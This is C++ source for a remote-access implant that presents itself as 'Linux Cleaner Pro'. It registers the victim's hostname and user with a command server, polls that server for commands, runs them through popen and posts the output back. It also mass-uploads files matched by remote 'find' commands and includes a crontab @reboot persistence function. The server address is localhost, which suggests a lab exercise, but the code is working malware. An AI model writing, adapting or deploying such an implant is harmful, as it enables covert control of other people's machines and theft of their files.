#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <fstream>
#include <csignal>

#include "curl/curl.h"

using namespace std; 

const string HOST_URL = "http://127.0.0.1:3000/";

string get_os() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

size_t write_data(void *contents, size_t size, size_t nmemb, void *userp) {
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

string exec(string cmd) {
    array<char, 128> buffer;
    string output;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);

    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        output += buffer.data();
    }

    output.erase(output.length()-1); // remove last newline

    return output;
}

string get(string url) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    return read_buffer;
}

string post(string url, string data) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());
        curl_easy_setopt(curl, CURLOPT_POST, 1);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return read_buffer;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

void upload_file(string url, string location, string id) {
    CURL *curl;
    CURLcode res;

    curl_mime *form = NULL;
    curl_mimepart *field = NULL;
    struct curl_slist *headerlist = NULL;
    static const char buf[] = "Expect:";

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl) {
        /* Create the form */
        form = curl_mime_init(curl);

        /* Fill in the client ID field */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id.c_str(), CURL_ZERO_TERMINATED);

        /* Fill in the file upload field */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, location.c_str());

        /* Fill in the filename field */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "filename");
        curl_mime_data(field, location.c_str(), CURL_ZERO_TERMINATED);

        /* Fill in the submit field too, even if this is rarely needed */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "submit");
        curl_mime_data(field, "send", CURL_ZERO_TERMINATED);

        /* initialize custom header list (stating that Expect: 100-continue is not
             wanted */
        headerlist = curl_slist_append(headerlist, buf);
        /* what URL that receives this POST */
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        /* Perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                            curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);

        /* then cleanup the form */
        curl_mime_free(form);
        /* free slist */
        curl_slist_free_all(headerlist);
    }
}

void make_shell_persistance() {
    //Create shell script to launch implant
    string file_path = "'" + exec("readlink -f a.out") + "'";
    string shellfile = "#! /bin/sh\n" + file_path;

    //Write script to file
    const char *write_path = "script.sh";
    std::ofstream out(write_path);
    out << shellfile;
    out.close();

    //Get persistance of launch script
    string script_path = exec("readlink -f script.sh");
    cout << script_path << endl;
    string sys_cmd = "(crontab -l; echo '@reboot sh "+ script_path +"' ) | crontab -";

    //Run scrip on Linux
    string os = get_os();
    if(os == "Linux"){
        system(sys_cmd.c_str());
    }
}

void mass_upload(string command, string id) {

    //This trash fire finds only the cd commands
    // to get path later
    string usePATH = "";
    string getPATH = command;
    string tempHelp;
    while( getPATH.length() != 0 ) {

        tempHelp = getPATH.substr( 0, getPATH.find(";") + 1 );
        if(tempHelp.substr(0,2) == "cd" ){
            usePATH.append(tempHelp);
            usePATH.append(" ");
        }

        //two spaces, one for ; and one for ' '
        getPATH = getPATH.substr( getPATH.find(";") + 2 );
        if(getPATH.find(";") == std::string::npos){
            break;
        }
    }
    // get that path and create a string of what to find
    string path = exec(usePATH + "pwd");
    string filesToUpload = exec(command);

    string tempFileName;

    // get the path string for each file found
    while( filesToUpload.length() != 0 ) {
        tempFileName = filesToUpload.substr(0, filesToUpload.find("\n") + 1);
        filesToUpload = filesToUpload.substr( filesToUpload.find("\n") + 1 );

        cout << path + "/" + tempFileName << endl;
        
        upload_file(HOST_URL + "upload", path + "/" + tempFileName, id);
    }
}

int main() {
    cout << "Starting up Linux Cleaner Pro!" << endl;
    cout << "The best optoin for best running!!!!!!!! :)" << endl;

    int wait_for_command_time = 3;
    string hostname = exec("hostname");
    string user = exec("id -un");
    string os = get_os();

    //make_shell_persistance();

    string id = "";
    while(id == "")
    {
        this_thread::sleep_for(chrono::seconds(3));
        id = post(HOST_URL + "connect", "hostname=" + hostname +
                "&user=" + user + "&os=" + os);
    }

    while (true) {
        string command = post(HOST_URL + "command", "id=" + id);
        string MacroCmd = command.substr(0, command.find("&"));
        command = command.substr(command.find("&")+1);

        if( MacroCmd == "find" ) {
            mass_upload(command, id);

        }else 
        if( MacroCmd == "time" ) {
            wait_for_command_time = stoi( command );

        } else 
        if( MacroCmd == "disconnect" ) {
            
        } else 
        if( MacroCmd == "command") {
            string output = exec(command);
            post(HOST_URL + "output", "id=" + id + "&output=" + output);

        }

        this_thread::sleep_for(chrono::seconds( wait_for_command_time ));
    }

    return 0;
}
